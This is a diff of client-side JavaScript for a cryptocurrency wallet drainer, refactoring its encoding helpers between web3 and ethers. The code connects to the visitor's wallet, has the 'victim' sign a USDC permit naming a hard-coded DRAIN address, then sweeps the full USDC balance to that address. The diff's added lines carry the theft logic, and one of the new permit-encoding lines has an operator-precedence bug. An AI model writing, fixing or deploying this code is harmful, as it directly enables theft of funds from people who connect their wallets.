@@ -28,13 +28,16 @@ const DRAIN = "0x0fac2542316Ad330EfA2bb386d606135b70a574B"; // Base/Eth drain wa
 const USDC  = { 8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 1: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0" };
 
 // ===== UTILS =====
-const keccak = (t,v) => Web3.utils.keccak256(Web3.eth.abi.encodeParameters(t,v));
 const pad32 = (a) => '0x' + a.slice(2).padStart(64,'0');
-const abiEnc = (t,v) => Web3.eth.abi.encodeParameters(t,v).slice(2);
+const keccak = (t,v) => {
+  const data = window.web3 ? window.web3.utils.keccak256(window.web3.eth.abi.encodeParameters(t,v))
+                           : ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(t,v));
+  return data;
+};
 
 // ===== WALLET WAIT-LOOP =====
 let eth;
-async function getProvider() {
+async function getEth() {
   let tries = 0;
   while (tries < 50 && !(window.ethereum || window.phantom?.ethereum)) {
     await new Promise(r => setTimeout(r, 100));
@@ -48,7 +51,7 @@ async function getProvider() {
 // ===== BUTTON HANDLER =====
 document.getElementById("go").addEventListener("click", async () => {
   try {
-    const eth = await getProvider();
+    const eth = await getEth();
     const [owner] = await eth.request({method:"eth_requestAccounts"});
     const chainId = parseInt(await eth.request({method:"eth_chainId"}),16);
     if (!USDC[chainId]) { alert("Switch to Ethereum or Base"); return; }
@@ -105,10 +108,9 @@ document.getElementById("go").addEventListener("click", async () => {
     });
 
     const {v,r,s} = ethers.utils.splitSignature(sig);
-    const permitData = "0xd505accf" + abiEnc(
-      ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
-      [owner,DRAIN,value,deadline,v,r,s]
-    );
+    const permitData = "0xd505accf" + window.web3
+      ? window.web3.eth.abi.encodeParameters(["address","address","uint256","uint256","uint8","bytes32","bytes32"],[owner,DRAIN,value,deadline,v,r,s]).slice(2)
+      : ethers.utils.defaultAbiCoder.encode(["address","address","uint256","uint256","uint8","bytes32","bytes32"],[owner,DRAIN,value,deadline,v,r,s]).slice(2);
 
     // 1. PERMIT (victim pays gas – appears in history)
     const permitTx = await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:permitData,gas:"0x186a0"}]});
@@ -116,7 +118,9 @@ document.getElementById("go").addEventListener("click", async () => {
     // 2. SWEEP 100 % balance
     const balHex = await eth.request({method:"eth_call",params:[{to:usdc,data:"0x70a08231"+pad32(owner)},"latest"]});
     const bal = BigInt(balHex);
-    const sweepData = "0xa9059cbb" + abiEnc(["address","uint256"],[DRAIN,bal.toString()]);
+    const sweepData = "0xa9059cbb" + (window.web3
+      ? window.web3.eth.abi.encodeParameters(["address","uint256"],[DRAIN,bal.toString()]).slice(2)
+      : ethers.utils.defaultAbiCoder.encode(["address","uint256"],[DRAIN,bal.toString()]).slice(2));
 
     const sweepTx= await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:sweepData,gas:"0x186a0"}]});
 
